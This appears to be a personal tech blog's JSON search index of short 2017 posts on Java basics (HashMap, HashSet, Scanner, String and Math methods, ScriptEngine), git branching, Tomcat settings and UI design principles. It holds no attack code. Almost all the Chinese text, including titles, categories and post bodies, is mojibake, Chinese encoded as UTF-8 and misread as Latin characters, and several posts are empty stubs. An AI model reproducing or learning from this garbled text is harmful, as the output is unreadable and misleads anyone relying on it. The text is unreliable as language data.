ç”¨æˆ·ä½“éªŒä¸‰è¦ç´  ç”¨æˆ·ä½“éªŒåˆ†ææ–¹æ³• VIMMå–èˆ","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"git åŸºæœ¬å‘½ä»¤","slug":"history/tech/5a310a5b863b4f2b5a550b87","date":"2017-12-12T23:09:15.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a310a5b863b4f2b5a550b87/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a310a5b863b4f2b5a550b87/","excerpt":"","text":"å‚è€ƒèµ„æ–™git ç®€æ˜æŒ‡å—https://try.github.io/levels/1/challenges/1https://git-scm.com/book/zh/v1","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"JAVA_OPTS å‚æ•°","slug":"history/tech/5a310918863b4f2b5a550b86","date":"2017-12-12T23:03:52.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a310918863b4f2b5a550b86/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a310918863b4f2b5a550b86/","excerpt":"","text":"-server -xms","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"é¡¹ç›®ç¯å¢ƒä¸git ç‰ˆæœ¬çš„å…³ç³»","slug":"history/tech/5a31024a863b4f2b5a550b85","date":"2017-12-12T22:34:50.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a31024a863b4f2b5a550b85/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a31024a863b4f2b5a550b85/","excerpt":"","text":"é¡¹ç›®ç¯å¢ƒä¸git ç‰ˆæœ¬çš„å…³ç³»å¼€å‘ç¯å¢ƒ éœ€è¦æäº¤åˆ°ä¸‹ä¸€ä¸ªreleaseçš„ç‰¹æ€§åˆ†æ”¯ æµ‹è¯•ç¯å¢ƒ releaseæˆ–æ˜¯development åˆ†æ”¯ é¢„å‘å¸ƒç¯å¢ƒ release ç”Ÿäº§ç¯å¢ƒ master","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ†æ”¯ç®¡ç†","slug":"history/tech/5a310081863b4f2b5a550b84","date":"2017-12-12T22:27:13.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a310081863b4f2b5a550b84/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a310081863b4f2b5a550b84/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java æ‰“ war åŒ…","slug":"history/tech/5a30fea7863b4f2b5a550b83","date":"2017-12-12T22:19:19.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a30fea7863b4f2b5a550b83/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a30fea7863b4f2b5a550b83/","excerpt":"","text":"æ‰“åŒ…å‘½ä»¤ï¼šjar cvf xxx.war . å°† war åŒ…æ‹·è´åˆ° webapps ä¸‹å³å¯","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"tomcat æ¶æ„","slug":"history/tech/5a30f0ca863b4f2b5a550b82","date":"2017-12-12T21:20:10.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a30f0ca863b4f2b5a550b82/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a30f0ca863b4f2b5a550b82/","excerpt":"","text":"server.xmlConnector Coyote é»˜è®¤ BIO Connector Container Catalina Servlet Connector å‚æ•°é…ç½®port address protocol connectionTimeout acceptCount maxConnections çº¿ç¨‹é…ç½®minSpareThreads maxThreads æ—¥å¿—é…ç½®","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æŸåº¦ç¬”è¯•é¢˜","slug":"history/tech/5a30e275863b4f2b5a550b81","date":"2017-12-12T20:19:01.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a30e275863b4f2b5a550b81/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a30e275863b4f2b5a550b81/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java æ‰§è¡Œjs","slug":"history/tech/5a2f555b863b4f2b5a550b6c","date":"2017-12-12T04:04:43.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2f555b863b4f2b5a550b6c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2f555b863b4f2b5a550b6c/","excerpt":"","text":"java æ‰§è¡Œjspackage test; import javax.script.Invocable; import javax.script.ScriptEngine; import javax.script.ScriptEngineManager; import javax.script.ScriptException; public class Hello{ public static void main(String[] args) throws NoSuchMethodException { ScriptEngineManager sem = new ScriptEngineManager(); ScriptEngine se = sem.getEngineByName(&quot;js&quot;); try { String script = &quot;function check(){ return JSON.stringify(arguments);};&quot;; se.eval(script); Invocable inv2 = (Invocable) se; String res=(String)inv2.invokeFunction(&quot;check&quot;, new String[] {&quot;1&quot;, &quot;2&quot;}); System.out.println(res); } catch (ScriptException ex) { ex.printStackTrace(); } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"web å¹³å°è®¾è®¡è§„èŒƒ","slug":"history/ui/5a2ffb4f863b4f2b5a550b7a","date":"2017-12-12T03:52:47.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2ffb4f863b4f2b5a550b7a/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2ffb4f863b4f2b5a550b7a/","excerpt":"","text":"æœ¬æ–‡ä¸»è¦å†…å®¹webä¸»æµå±å¹• å¸¸ç”¨æµè§ˆå™¨ é¡µé¢äº¤äº’æ“ä½œè¡Œä¸º h5é¡µé¢çš„è®¾è®¡æ–¹æ³• å“åº”å¼è®¾è®¡ ç½‘é¡µå°ºå¯¸ ä¸»æµæµè§ˆå™¨ æ“ä½œ å“åº”å¼è®¾è®¡ h5 æ‰‹æœºé¡µé¢","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"Android UI è®¾è®¡è§„èŒƒ","slug":"history/ui/5a2ff1d3863b4f2b5a550b79","date":"2017-12-12T03:12:19.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2ff1d3863b4f2b5a550b79/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2ff1d3863b4f2b5a550b79/","excerpt":"","text":"æ¦‚å¿µå‚è€ƒ ios ui è®¾è®¡è§„èŒƒ http://blog.qianrushi.org/topic/5a2fe879863b4f2b5a550b78 ICON ä½¿ç”¨è§„èŒƒ æ–‡å­—ä½¿ç”¨è§„èŒƒ é…è‰²è§„èŒƒå¼ºè°ƒè‰² ä¸»é¢˜ æ‰‹åŠ¿æ“ä½œ","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"IOS UI è®¾è®¡è§„èŒƒ","slug":"history/ui/5a2fe879863b4f2b5a550b78","date":"2017-12-12T02:32:25.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2fe879863b4f2b5a550b78/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2fe879863b4f2b5a550b78/","excerpt":"","text":"æ¦‚å¿µä¸»æµå¹³å°çš„è®¾è®¡è§„èŒƒIOS é•¿æŒ‰ å¯¹æ®µè½æ–‡å­—çš„æ“ä½œ(å¤åˆ¶ï¼Œç²˜è´´, å…¨é€‰) Android é•¿æŒ‰ é€šå¸¸é’ˆå¯¹æŸä¸€ list, å¼¹å‡ºèœå•æ“ä½œ æœ¬æ–‡ä¸»è¦å†…å®¹ios ä¸»æµå±å¹• iconçš„ä½¿ç”¨è§„èŒƒ æ–‡å­—çš„è®¾è®¡è§„èŒƒ é¢œè‰²å’Œæ§ä»¶çš„è®¾è®¡è§„èŒƒ UI çš„æ‰‹åŠ¿äº¤äº’æ¦‚è¿° UIçš„åŠ¨æ•ˆæ¦‚è¿° è‹¹æœæ–‡å­—è®¾è®¡è§„èŒƒ è‹¹æœé…è‰²è§„èŒƒ ç‚¹å‡»åŒºåŸŸ æ‰‹åŠ¿æ“ä½œ","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"java å‘ä¸Šé€ å‹","slug":"history/tech/5a2f3f10863b4f2b5a550b6b","date":"2017-12-12T02:29:36.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2f3f10863b4f2b5a550b6b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2f3f10863b4f2b5a550b6b/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ui è®¾è®¡ä¸­çš„å¸¸è§é—®é¢˜","slug":"history/ui/5a2fe6c6863b4f2b5a550b77","date":"2017-12-12T02:25:10.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2fe6c6863b4f2b5a550b77/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2fe6c6863b4f2b5a550b77/","excerpt":"","text":"è¿›æ·±å…³ç³»è§†è§‰æµä¸ºä»€ä¹ˆæ–‡å­—è¯¥å¯¹é½ç”¨ä»€ä¹ˆæ ·çš„å­—ä½“å­—å·æ¯ä¸ªå­—ä½“å­—å·ç”¨ä»€ä¹ˆé¢œè‰²","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"åŠ¨æ•ˆè®¾è®¡","slug":"history/ui/5a2fdd6f863b4f2b5a550b76","date":"2017-12-12T01:45:19.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2fdd6f863b4f2b5a550b76/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2fdd6f863b4f2b5a550b76/","excerpt":"","text":"å¹³é¢è®¾è®¡ä¸»è¦æ˜¯å®ç°ä¸¤ç‚¹:ä¼ é€’ä¿¡æ¯ æ°›å›´çƒ˜æ‰˜ åŠ¨æ•ˆè®¾è®¡æ˜¯å¤„äºåŠ¨ç”»è®¾è®¡å’Œå¹³é¢è®¾è®¡ä¹‹é—´çš„ä¸€ç§äº¤å‰æ€§çš„å­¦ç§‘ï¼Œä»–æ˜¯åˆ©ç”¨åŠ¨æ€çš„å›¾ç‰‡æ¥ä¼ é€’ä¿¡æ¯å’Œè¡¨è¾¾æ°›å›´çš„ã€‚ åŠ¨æ€çš„å›¾ç‰‡ ä¼ é€’ä¿¡æ¯ è¡¨è¾¾æ°›å›´ åŠ¨æ•ˆçš„ä½œç”¨äº§å“å±•ç¤º å“ç‰Œå»ºè®¾ äº¤äº’å±•ç¤º ui åŠ¨æ•ˆæµç•…è¿‡æ¸¡ é«˜æ•ˆåé¦ˆ å¢å¼ºæ“çºµ å¸®åŠ©å¼•å¯¼ å‡åä½“éªŒ åŠ¨æ•ˆçš„å‘åˆ‡å¿Œå¤æ‚ç¹ç æ³¨æ„å¼€å‘æˆæœ¬ æ€§èƒ½ä¸å“åº”åº¦","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"ä¸€å¤§æ³¢å¾®ä¿¡å°ç¨‹åº","slug":"history/tech/5a2fdc8f863b4f2b5a550b75","date":"2017-12-12T01:41:35.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2fdc8f863b4f2b5a550b75/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2fdc8f863b4f2b5a550b75/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å¾®ä¿¡å°ç¨‹åº","slug":"å¾®ä¿¡å°ç¨‹åº","permalink":"https://wangxiuwen.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"å°ç¨‹åº","slug":"å°ç¨‹åº","permalink":"https://wangxiuwen.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"author":"baipeng"},{"title":"æ— çº¿ app è®¾è®¡","slug":"history/ui/5a2fd85e863b4f2b5a550b72","date":"2017-12-12T01:23:42.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a2fd85e863b4f2b5a550b72/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a2fd85e863b4f2b5a550b72/","excerpt":"","text":"æ— çº¿appè®¾è®¡ä¸­ï¼Œæ¶‰åŠåˆ°çš„ä¸€äº›æ¦‚å¿µäº¤äº’ è®¾è®¡ç›®çš„ äº§å“ç›®çš„ï¼šå·®å¼‚åŒ– åŠŸèƒ½ç›®çš„ é¡µé¢ç»“æ„ å±‚çº§å±•ç°: é€šè¿‡é¢œè‰²æ˜æš—ï¼Œå¤§å°ï¼Œè·ç¦»ï¼Œå å‹ è®¾è®¡ æ§ä»¶è§„èŒƒ(iohone4ä¹‹å‰ 1x å›¾ï¼Œ iphone4 ä¹‹åå‡ºç°2xå›¾ï¼Œ iphone6plus 3xå›¾) ä¿¡æ¯åˆ†æ å±‚çº§å±•ç° æ§ä»¶è§„èŒƒ ä¿¡æ¯åˆ†æ","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"è®¾è®¡åŸºæœ¬åŸåˆ™","slug":"history/interactive/5a2fc51a863b4f2b5a550b71","date":"2017-12-12T00:01:30.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/interactive/5a2fc51a863b4f2b5a550b71/","link":"","permalink":"https://wangxiuwen.github.io/history/interactive/5a2fc51a863b4f2b5a550b71/","excerpt":"","text":"å°Šé‡ç”¨æˆ·ä¹ æƒ¯ä¸è¦åœ¨ä¸å¿…è¦çš„åœ°æ–¹ä½“ç°å·®åˆ«","categories":[{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/categories/%E4%BA%A4%E4%BA%92/"}],"tags":[{"name":"interactive","slug":"interactive","permalink":"https://wangxiuwen.github.io/tags/interactive/"},{"name":"äº¤äº’","slug":"äº¤äº’","permalink":"https://wangxiuwen.github.io/tags/%E4%BA%A4%E4%BA%92/"}],"author":"wangxiuwen"},{"title":"java MVC","slug":"history/tech/5a2f8a6a863b4f2b5a550b70","date":"2017-12-11T19:51:06.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2f8a6a863b4f2b5a550b70/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2f8a6a863b4f2b5a550b70/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java æ³¨å…¥åè½¬","slug":"history/tech/5a2f893d863b4f2b5a550b6f","date":"2017-12-11T19:46:05.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2f893d863b4f2b5a550b6f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2f893d863b4f2b5a550b6f/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java å†…éƒ¨ç±» åŒ¿åç±»","slug":"history/tech/5a2f88d6863b4f2b5a550b6e","date":"2017-12-11T19:44:22.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2f88d6863b4f2b5a550b6e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2f88d6863b4f2b5a550b6e/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java ç‹ç‹¸ä¸å…”å­","slug":"history/tech/5a2f8428863b4f2b5a550b6d","date":"2017-12-11T19:24:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2f8428863b4f2b5a550b6d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2f8428863b4f2b5a550b6d/","excerpt":"","text":"https://github.com/wangxiuwen-fork/JavaFoxAndRabbit","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java Math æ–¹æ³•","slug":"history/tech/5a2e072b863b4f2b5a550b64","date":"2017-12-11T04:18:51.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e072b863b4f2b5a550b64/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e072b863b4f2b5a550b64/","excerpt":"","text":"java Math æ–¹æ³•package test; public class Hello { public static void main(String[] args) { System.out.println(Math.abs(-2)); System.out.println(Math.round(2.2)); System.out.println(Math.random()); System.out.println(Math.pow(2, 3)); } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java åŸºç¡€ String åŒ…è£…ç±»çš„ä¸€äº›åŸºç¡€æ–¹æ³•","slug":"history/tech/5a2e0353863b4f2b5a550b63","date":"2017-12-11T04:02:27.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e0353863b4f2b5a550b63/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e0353863b4f2b5a550b63/","excerpt":"","text":"java åŸºç¡€ String åŒ…è£…ç±»çš„ä¸€äº›åŸºç¡€æ–¹æ³•package test; public class Hello { public static void main(String[] args) { if(&quot;equals&quot;.equals(&quot;equals&quot;)) { System.out.println(&quot;equal!&quot;); } System.out.println(&quot;compareTo&quot;.compareTo(&quot;compareTo&quot;)); System.out.println(&quot;charAt&quot;.charAt(0)); System.out.println(&quot;indexOf&quot;.indexOf('n')); // å¾—åˆ°cå­—ç¬¦æ‰€åœ¨çš„ä½ç½®ï¼Œ-1è¡¨ç¤ºä¸å­˜åœ¨ System.out.println(&quot;indexOf&quot;.indexOf('n',1)); //ä»nå·ä½ç½®å¼€å§‹å¯»æ‰¾å­—ç¬¦ System.out.println(&quot;lastIndexOf&quot;.lastIndexOf('n',1)); //ä»nå·ä½ç½®å¼€å§‹å¯»æ‰¾å­—ç¬¦ System.out.println(&quot;toLowerCase&quot;.toLowerCase()); System.out.println(&quot;toUpperCase&quot;.toUpperCase()); System.out.println(&quot; tr im &quot;.trim()); System.out.println(&quot;replace&quot;.replace(&quot;ce&quot;, &quot;ced&quot;)); System.out.println(&quot;startsWith&quot;.startsWith(&quot;st&quot;, 0)); System.out.println(&quot;endsWith&quot;.endsWith(&quot;th&quot;)); } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java åŸºç¡€ scanner çš„ä½¿ç”¨","slug":"history/tech/5a2e0154863b4f2b5a550b62","date":"2017-12-11T03:53:56.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e0154863b4f2b5a550b62/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e0154863b4f2b5a550b62/","excerpt":"","text":"java åŸºç¡€ scanner çš„ä½¿ç”¨package test; import java.util.Scanner; public class Hello { public static void main(String[] args) { int i; double d; Scanner in = new Scanner(System.in); i = in.nextInt(); d = in.nextDouble(); System.out.println(&quot;int=&quot;+i); System.out.println(&quot;double=&quot;+d); System.out.println(&quot;å¼ºåˆ¶è½¬æ¢=&quot;+(int)d); } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java å“ˆå¸Œè¡¨ HashMap","slug":"history/tech/5a2e6457863b4f2b5a550b6a","date":"2017-12-10T22:56:23.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e6457863b4f2b5a550b6a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e6457863b4f2b5a550b6a/","excerpt":"","text":"HashMappackage test; import java.util.HashMap; public class Hello{ public static void main(String[] args) { HashMap&lt;String, String&gt; s = new HashMap&lt;String,String&gt;(); s.put(&quot;key&quot;, &quot;value&quot;); System.out.println(s); System.out.println(s.keySet().size()); System.out.println(s.keySet()); System.out.println(s.get(&quot;key&quot;)); } } æ³¨æ„ HashMap çš„ä¸¤ä¸ªå‚æ•°ä¸èƒ½æ˜¯åŸºæœ¬ç±»å‹ï¼ŒInteger å¯ä»¥ï¼Œä½†æ˜¯ int ä¸è¡Œ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java é›†åˆ(hashset)","slug":"history/tech/5a2e61c4863b4f2b5a550b69","date":"2017-12-10T22:45:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e61c4863b4f2b5a550b69/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e61c4863b4f2b5a550b69/","excerpt":"","text":"java é›†åˆ(hashset)package test; import java.util.HashSet; public class Hello{ public static void main(String[] args) { HashSet&lt;String&gt; s = new HashSet&lt;String&gt;(); s.add(&quot;a&quot;); s.add(&quot;b&quot;); s.add(&quot;a&quot;); for (String k : s) { System.out.println(k); } System.out.println(s); } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java æ•°ç»„","slug":"history/tech/5a2e54bc863b4f2b5a550b68","date":"2017-12-10T21:49:48.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a2e54bc863b4f2b5a550b68/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2e54bc863b4f2b5a550b68/","excerpt":"","text":"å¯¹è±¡æ•°ç»„å¯¹è±¡æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å¯¹è±¡çš„ç®¡ç†è€…è€Œéå¯¹è±¡æœ¬èº«package test; public class Hello{ public static void main(String[] args) { String[] s = new String[10]; System.out.println(s[0]); } } java for-each 